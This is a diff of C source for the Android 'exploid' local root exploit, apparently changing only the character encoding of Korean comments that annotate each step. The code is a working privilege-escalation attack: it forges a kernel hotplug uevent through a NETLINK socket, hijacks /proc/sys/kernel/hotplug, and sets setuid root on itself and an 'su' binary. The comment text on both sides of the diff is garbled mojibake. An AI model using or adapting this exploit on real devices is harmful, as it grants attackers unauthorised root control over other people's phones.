@@ -46,15 +46,15 @@
  *
  */
 
-// ´ë°­ ºÐ¼®Çß½À´Ï´Ù.
-// Æ²¸° ºÎºÐÀÌ ¿©·¯ ºÎºÐ ÀÖ´Â°Å °°³×¿ä.
-// »ó¼¼ ºÎºÐ ºÐ¼®ÀÌ ÇÊ¿äÇÕ´Ï´Ù.
-// ³»ÀÏ: 2Â÷ ºÐ¼®
-// ¸ð·¹: 3Â÷ ºÐ¼®
-// Àú¸ð·¹: 4Â÷ ºÐ¼® (¼¼ºÎ ºÐ¼®)
-// ±×¸ð·¹: º¸°í¼­ ÀÛ¼º (¸®Æ÷ÆÃ)
-// 5ÀÏ µ¿¾È ºÐ¼®ÇØº¸°í ³ª¼­ ÀÚ·á¸¦ ¶Ç °Ë»öÇÒÁö °áÁ¤ÇÒ ÀÍ½ºÇÃ·ÎÀÕ ÄÚµåÀÔ´Ï´Ù.
-// hotplug Ãë¾àÁ¡ÀÌ¶ó°í ÇÏÁÒ.
+// ëŒ€ê°• ë¶„ì„í–ˆìŠµë‹ˆë‹¤.
+// í‹€ë¦° ë¶€ë¶„ì´ ì—¬ëŸ¬ ë¶€ë¶„ ìžˆëŠ”ê±° ê°™ë„¤ìš”.
+// ìƒì„¸ ë¶€ë¶„ ë¶„ì„ì´ í•„ìš”í•©ë‹ˆë‹¤.
+// ë‚´ì¼: 2ì°¨ ë¶„ì„
+// ëª¨ë ˆ: 3ì°¨ ë¶„ì„
+// ì €ëª¨ë ˆ: 4ì°¨ ë¶„ì„ (ì„¸ë¶€ ë¶„ì„)
+// ê·¸ëª¨ë ˆ: ë³´ê³ ì„œ ìž‘ì„± (ë¦¬í¬íŒ…)
+// 5ì¼ ë™ì•ˆ ë¶„ì„í•´ë³´ê³  ë‚˜ì„œ ìžë£Œë¥¼ ë˜ ê²€ìƒ‰í• ì§€ ê²°ì •í•  ìµìŠ¤í”Œë¡œìž‡ ì½”ë“œìž…ë‹ˆë‹¤.
+// hotplug ì·¨ì•½ì ì´ë¼ê³  í•˜ì£ .
 
 #include <stdio.h>
 #include <sys/socket.h>
@@ -94,7 +94,7 @@ void rootshell(char **env)
 }
 
 
-// ¿£Æ®¸® Æ÷ÀÎÆ®: ¸ÞÀÎ ÇÔ¼ö ±â´É.
+// ì—”íŠ¸ë¦¬ í¬ì¸íŠ¸: ë©”ì¸ í•¨ìˆ˜ ê¸°ëŠ¥.
 int main(int argc, char **argv, char **env)
 {
 	char buf[512], path[512];
@@ -106,41 +106,41 @@ int main(int argc, char **argv, char **env)
 	char *basedir = NULL, *logmessage;
 
 
-        // androidÀÇ rtld(·±Å¸ÀÓ ·Î´õ)ÀÇ LD_ ¹ö±×°¡ ¾ø´ÂÁö È®ÀÎÈÄ ÀÖÀ» ½Ã, rootshell()À» ¹Ù·Î Å´.
+        // androidì˜ rtld(ëŸ°íƒ€ìž„ ë¡œë”)ì˜ LD_ ë²„ê·¸ê°€ ì—†ëŠ”ì§€ í™•ì¸í›„ ìžˆì„ ì‹œ, rootshell()ì„ ë°”ë¡œ í‚´.
 	/* I hope there is no LD_ bug in androids rtld :) */
 	if (geteuid() == 0 && getuid() != 0)
 		rootshell(env);
 
-        // /proc/self/exe(½© µ¥ÀÌÅÍ)¿¡¼­ path º¯¼ö·Î °æ·Î¸¦ ÀÐÀ½.
+        // /proc/self/exe(ì‰˜ ë°ì´í„°)ì—ì„œ path ë³€ìˆ˜ë¡œ ê²½ë¡œë¥¼ ì½ìŒ.
 	if (readlink("/proc/self/exe", path, sizeof(path)) < 0)
 		die("[-] readlink");
 
-        // ·çÆ® À¯Àú(geteuid() == 0)ÀÌ¸é
+        // ë£¨íŠ¸ ìœ ì €(geteuid() == 0)ì´ë©´
 	if (geteuid() == 0) {
-		clear_hotplug(); // ÇÖÇÃ·¯±×¸¦ Å¬¸®¾îÇÔ.
+		clear_hotplug(); // í•«í”ŒëŸ¬ê·¸ë¥¼ í´ë¦¬ì–´í•¨.
 			
-		chown(path, 0, 0); // °ø°Ý ÄÚµå °æ·Î¸¦ 0, 0À¸·Î ¼ÒÀ¯ÀÚ¸¦ ·çÆ®·Î º¯°æ.
-		chmod(path, 04711); // ÆÛ¹Ì¼ÇÀ» 4711·Î ¼³Á¤.
+		chown(path, 0, 0); // ê³µê²© ì½”ë“œ ê²½ë¡œë¥¼ 0, 0ìœ¼ë¡œ ì†Œìœ ìžë¥¼ ë£¨íŠ¸ë¡œ ë³€ê²½.
+		chmod(path, 04711); // í¼ë¯¸ì…˜ì„ 4711ë¡œ ì„¤ì •.
 		
-		chown("/sqlite_stmt_journals/su", 0, 0); // sqlite_stmt_journals/suÀÇ ¼ÒÀ¯ÀÚ¸¦ 0À¸·Î ¼³Á¤
-		chmod("/sqlite_stmt_journals/su", 06755); // ÆÛ¹Ì¼ÇÀ» 6755·Î ¼³Á¤.
+		chown("/sqlite_stmt_journals/su", 0, 0); // sqlite_stmt_journals/suì˜ ì†Œìœ ìžë¥¼ 0ìœ¼ë¡œ ì„¤ì •
+		chmod("/sqlite_stmt_journals/su", 06755); // í¼ë¯¸ì…˜ì„ 6755ë¡œ ì„¤ì •.
 
-		return 0; // ¸®ÅÏ.
+		return 0; // ë¦¬í„´.
 	}
 
 	printf("[*] Android local root exploid (C) The Android Exploid Crew\n");
 	printf("[*] Modified by Martin Paul Eve for Wildfire Stage 1 soft-root\n");
 
-	basedir = "/sqlite_stmt_journals"; // ·çÆ®°¡ ¾Æ´Ò ¶§ basedir = /sqlite_stmt_journals.
+	basedir = "/sqlite_stmt_journals"; // ë£¨íŠ¸ê°€ ì•„ë‹ ë•Œ basedir = /sqlite_stmt_journals.
 	if (chdir(basedir) < 0) {
-		basedir = "/data/local/tmp"; // basedirÀÌ ¾øÀ»¶§ /data/local/tmp·Î ¼³Á¤.
-		if (chdir(basedir) < 0) // basedir·Î °æ·Î ÀÌµ¿.
+		basedir = "/data/local/tmp"; // basedirì´ ì—†ì„ë•Œ /data/local/tmpë¡œ ì„¤ì •.
+		if (chdir(basedir) < 0) // basedirë¡œ ê²½ë¡œ ì´ë™.
 			basedir = strdup(getcwd(buf, sizeof(buf)));
 	}
 	printf("[+] Using basedir=%s, path=%s\n", basedir, path);
 	printf("[+] opening NETLINK_KOBJECT_UEVENT socket\n");
 
-        // NETLINK_KOBJECT_UEVENT ¼ÒÄÏÀ» »ý¼º.
+        // NETLINK_KOBJECT_UEVENT ì†Œì¼“ì„ ìƒì„±.
 	memset(&snl, 0, sizeof(snl));
 	snl.nl_pid = 1;
 	snl.nl_family = AF_NETLINK;
@@ -149,7 +149,7 @@ int main(int argc, char **argv, char **env)
 		die("[-] socket");
 
 	close(creat("loading", 0666));
-        // hotplug¸¦ 644 ÆÛ¹Ì¼ÇÀ¸·Î »ý¼ºÇÏ°í path(°ø°Ý ÄÚµå °æ·Î)¸¦ ÀúÀå.
+        // hotplugë¥¼ 644 í¼ë¯¸ì…˜ìœ¼ë¡œ ìƒì„±í•˜ê³  path(ê³µê²© ì½”ë“œ ê²½ë¡œ)ë¥¼ ì €ìž¥.
 	if ((ofd = creat("hotplug", 0644)) < 0)
 		die("[-] creat");
 	if (write(ofd, path , strlen(path)) < 0)
@@ -157,16 +157,16 @@ int main(int argc, char **argv, char **env)
 
        	close(ofd);
 
-        // /proc/sys/kernel/hotplug¸¦ data ÆÄÀÏ·Î ½Éº¼¸¯¸µÅ© ÀúÀå.
+        // /proc/sys/kernel/hotplugë¥¼ data íŒŒì¼ë¡œ ì‹¬ë³¼ë¦­ë§í¬ ì €ìž¥.
 	symlink("/proc/sys/kernel/hotplug", "data");
 
-        // buf¿¡ ACTION=add °ü·Ã hotplug ÀÍ½ºÇÃ·ÎÀÕ Æ®¸®°Å ¿äÃ» ¼³Á¤.
+        // bufì— ACTION=add ê´€ë ¨ hotplug ìµìŠ¤í”Œë¡œìž‡ íŠ¸ë¦¬ê±° ìš”ì²­ ì„¤ì •.
 	snprintf(buf, sizeof(buf), "ACTION=add%cDEVPATH=/..%s%c"
 	         "SUBSYSTEM=firmware%c"
 	         "FIRMWARE=../../..%s/hotplug%c", 0, basedir, 0, 0, basedir, 0);
 	printf("[+] sending add message ...\n");
 
-        // ¼ÒÄÏÀ¸·Î ¼³Á¤ÇÑ ¸Þ½ÃÁö Àü¼Û. (Æ®¸®°Å!)
+        // ì†Œì¼“ìœ¼ë¡œ ì„¤ì •í•œ ë©”ì‹œì§€ ì „ì†¡. (íŠ¸ë¦¬ê±°!)
 	if (sendmsg(sock, &msg, 0) < 0)
 		die("[-] sendmsg");
 	close(sock);
